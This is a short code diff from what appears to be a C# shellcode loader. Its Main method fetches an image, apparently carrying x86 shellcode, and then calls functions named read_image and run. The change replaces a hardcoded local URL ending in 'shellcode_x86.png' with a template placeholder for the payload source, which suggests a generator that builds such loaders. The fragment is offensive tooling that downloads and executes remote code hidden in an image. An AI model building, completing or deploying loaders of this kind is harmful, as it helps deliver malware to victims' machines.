@@ -53,7 +53,7 @@ namespace csharp
 
         static void Main(string[] args)
         {
-            load_image("http://127.0.0.1:8080/shellcode_x86.png");
+            load_image("{{ PAYLOAD_SOURCE }}");
             read_image();
             run();
             Thread.Sleep(3000);
